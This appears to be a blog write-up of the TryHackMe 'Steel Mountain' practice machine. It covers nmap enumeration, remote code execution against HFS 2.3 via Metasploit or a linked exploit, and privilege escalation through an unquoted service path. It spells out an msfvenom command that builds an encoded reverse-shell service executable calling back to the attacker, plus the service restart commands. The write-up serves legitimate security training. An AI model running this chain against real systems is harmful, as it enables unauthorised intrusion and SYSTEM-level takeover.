---
title: "TryHackMe - Steel Mountain"
author: Nasrallah
description: ""
date: 2022-05-15 00:00:00 +0000
categories : [TryHackMe]
tags: [tryhackme, Windows, metasploit, msfvenom, usp]
---

<div align="center"> <script src="https://tryhackme.com/badge/367641"></script> </div>

---


# **Description**

Hello hackers, I hope you are doing well. We are doing [Steel Mountain](https://tryhackme.com/room/steelmountain) from [TryHackMe](https://tryhackme.com). It's a windows machine running a vulnerable webserver, the vulnerability permits us to execute commands remotely, so we used an exploit to get a reverse shell. Once we're in the machine, we find a service with an unquoted service path, we create and exploit for that and use it to escalate our privileges. 

# **Enumeration**

## nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for 10.10.36.31
Host is up (0.10s latency).        
Not shown: 989 closed tcp ports (reset) 
PORT      STATE SERVICE            VERSION
80/tcp    open  http               Microsoft IIS httpd 8.5
|_http-server-header: Microsoft-IIS/8.5 
|_http-title: Site doesn't have a title (text/html).  
| http-methods:                                                                                                                                               
|_  Potentially risky methods: TRACE
135/tcp   open  msrpc              Microsoft Windows RPC                                                                                                      
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open  ssl/ms-wbt-server?
| ssl-cert: Subject: commonName=steelmountain
| Not valid before: 2022-05-15T09:46:41
|_Not valid after:  2022-11-14T09:46:41
|_ssl-date: 2022-05-16T10:19:46+00:00; 0s from scanner time.
8080/tcp  open  http               HttpFileServer httpd 2.3
|_http-server-header: HFS 2.3
|_http-title: HFS /
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49155/tcp open  msrpc              Microsoft Windows RPC
49156/tcp open  msrpc              Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.0.2: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2022-05-16T10:19:42
|_  start_date: 2022-05-16T09:46:29
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_nbstat: NetBIOS name: STEELMOUNTAIN, NetBIOS user: <unknown>, NetBIOS MAC: 02:80:6a:01:02:d7 (unknown)
```

We got plenty of open ports, and we can see it's a windows machine.

## Web

Let's navigate to the webserver on port 80.

![](/assets/img/tryhackme/steel/1.png)

Let's view the source code.

![](/assets/img/tryhackme/steel/2.png)

We got the name of the employee of the month, it's Bill Harper.

On the other webserver, we see that it's running `http file server 2.3`, let's see if there is any vulnerabilities in this version.

![](/assets/img/tryhackme/steel/3.png)

There is a remote command execution vulnerability.

# **Foothold**

## Metasploit

To get foothold using `metasploit`, we can use this exploit `exploit/windows/http/rejetto_hfs_exec`.

Launch metasploit by running `msfconsole`, and run `use exploit/windows/http/rejetto_hfs_exec`.

After that, we need to specify the RHOSTS, RPORT and LHOST.
 
 - RHOSTS: is the target machine's IP.
 - RPORT : is the port of the vulnerable web server (8080).
 - LHOST : is the attacker machine's IP, tun0.

![](/assets/img/tryhackme/steel/4.png)

## Exploit

To get foothold without metasploit, we can use exploits found in [Exploit-DB](https://www.exploit-db.com/) or other places..

In this example, I'll be using this [Exploit](https://github.com/NullByte007/Exploits/blob/master/Rejetto_HFS_2.3.X_RCE/HFS_RCE.py).

![](/assets/img/tryhackme/steel/5.png)


# **Privilege Escalation**

For this part, we're going to use the script suggested in the room; [PowerUp.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1). We'll upload it using meterpreter, and load powershell in order to execute the script.

![](/assets/img/tryhackme/steel/6.png)

Now, we need to load the script with the command `. .\PowerUp.ps1` and the execute it with `Invoke-AllCheck`.

![](/assets/img/tryhackme/steel/7.png)

We can see that the `AdvancedSystemCareService9` service has an unquoted service path, we can restart it, and have write permissions on it's folder.

Let's create an executable that would sends us a shell once it's executed.

`msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=9999 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe`

Then we need to upload the `Advanced.exe` file to the machine, and put it in the correct folder.

![](/assets/img/tryhackme/steel/8.png)


Next, we need to setup a multi handler listener to catch the reverse shell.

![](/assets/img/tryhackme/steel/9.png)

Now, we need to restart the `AdvancedSystemCareService9` service. To do that, we have to stop it with the command `sc stop AdvancedSystemCareService9` and start it with `sc start AdvancedSystemCareService9`. All that need to happen in a windows command shell, so type `shell` in meterpreter.

![](/assets/img/tryhackme/steel/10.png)

Now if we go to our multi handler listener, we should see a windows shell, and we have system privileges.

![](/assets/img/tryhackme/steel/11.png)

---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).

---

# References
